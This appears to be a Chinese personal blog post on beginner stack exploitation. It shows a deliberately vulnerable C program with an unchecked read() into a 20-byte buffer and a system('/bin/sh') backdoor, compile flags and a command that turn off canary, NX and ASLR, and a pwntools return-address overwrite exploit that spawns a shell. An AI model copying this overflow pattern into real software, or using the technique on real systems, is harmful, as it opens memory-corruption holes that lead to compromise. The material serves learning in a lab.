---
layout:     post   			        # 使用的布局（不需要改）
title:      pwnable   			# 标题 
subtitle:   (tw)  			#副标题
date:       2019-06-03 				# 时间
author:     pic4xiu 		    		# 作者
header-img: img/post-bg-debug.png 		#这篇文章标题背景图片
catalog: true 					# 是否归档
tags:						#标签
    - pwn
---

今天从零开始学**stack**,也算是记录一下吧,在这里记录一下特别细的知识点

## 溢出点的探索

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
    char buf[20];
    read(STDIN_FILENO, buf, 256);
}
void cat()
{
	system("/bin/sh");}
int main(int argc, char** argv) {
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
}
```

使用`gcc -g -fno-stack-protector -z execstack -o test test.c`依次关掉**Canary**和**NX**,之后我们`echo 0 > /proc/sys/kernel/randomize_va_space`关闭`PIE`

之后`cyclic 50`直接粘贴到运行的程序中,理论上程序会正常退出,我们找到**rbp**的值,使用`cyclic -l (字符串)`后定位到buf和rbp相差32个字节,同时我们应注意把之前的**rbp**进行覆盖,所以应该是40字节
```
#encoding:utf-8
#!/upr/bin/env python
from pwn import
context.log_level = "debug"
p=process("./level1")
binsh =0x00004005D7#通过ida找到的固定地址后门函数
payload = "a"*40+p64(binsh)
p.send(payload)
p.interactive()
```

## ASLR和PIE的各种事

这是上边的程序关闭**ASLR**和**PIE**后的亚子
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /home/pic/桌面/level1
          0x600000           0x601000 r--p     1000 0      /home/pic/桌面/level1
          0x601000           0x602000 rw-p     1000 1000   /home/pic/桌面/level1
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7fd5000     0x7ffff7fd8000 rw-p     3000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

